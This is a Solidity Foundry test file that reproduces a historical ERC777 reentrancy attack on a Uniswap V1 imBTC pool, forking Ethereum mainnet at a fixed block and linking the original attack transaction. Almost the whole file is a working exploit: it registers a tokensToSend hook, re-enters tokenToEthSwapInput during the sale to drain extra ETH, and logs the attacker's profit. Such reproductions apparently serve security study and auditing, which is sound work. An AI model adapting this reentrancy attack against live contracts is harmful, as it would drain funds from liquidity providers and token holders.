// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
//import "./../interface.sol";

// Analysis
// https://blog.blockmagnates.com/detailed-explanation-of-uniswaps-erc777-re-entry-risk-8fa5b3738e08
// TX
// https://explorer.phalcon.xyz/tx/eth/0x32c83905db61047834f29385ff8ce8cb6f3d24f97e24e6101d8301619efee96e?line=37
// https://etherscan.io/tx/0x32c83905db61047834f29385ff8ce8cb6f3d24f97e24e6101d8301619efee96e

interface UniswapV1 {
    function ethToTokenSwapInput(uint256 min_token, uint256 deadline) external payable returns (uint256);
    function tokenToEthSwapInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline) external returns (uint256);
}

interface IERC1820Registry {
    function setInterfaceImplementer(address _addr, bytes32 _interfaceHash, address _implementer) external;
}

interface IERC777 {
    function approve(address spender, uint256 value) external returns (bool);
}

contract ContractTest is Test {
    UniswapV1 uniswapv1 = UniswapV1(0xFFcf45b540e6C9F094Ae656D2e34aD11cdfdb187);
    IERC777 imbtc = IERC777(0x3212b29E33587A00FB1C83346f5dBFA69A458923);
    uint256 i = 0;

    function setUp() public {
        vm.createSelectFork("mainnet", 9_894_153);
    }

    function testExploit() public {
        IERC1820Registry _erc1820 = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
        _erc1820.setInterfaceImplementer(address(this), keccak256("ERC777TokensSender"), address(this));

        uniswapv1.ethToTokenSwapInput{value: 1 ether}(
            1, 115_792_089_237_316_195_423_570_985_008_687_907_853_269_984_665_640_564_039_457_584_007_913_129_639_935
        );

        uint256 beforeBalance = address(this).balance;

        imbtc.approve(address(uniswapv1), 10_000_000);
        uniswapv1.tokenToEthSwapInput(
            823_084,
            1,
            115_792_089_237_316_195_423_570_985_008_687_907_853_269_984_665_640_564_039_457_584_007_913_129_639_935
        );
        uint256 afterBalance = address(this).balance;
        emit log_named_decimal_uint("My ETH Profit", afterBalance - beforeBalance - 1 ether, 18);
    }

    function tokensToSend(address, address, address, uint256, bytes calldata, bytes calldata) external {
        if (i < 1) {
            i++;
            uniswapv1.tokenToEthSwapInput(
                823_084,
                1,
                115_792_089_237_316_195_423_570_985_008_687_907_853_269_984_665_640_564_039_457_584_007_913_129_639_935
            );
        }
    }

    receive() external payable {}
}
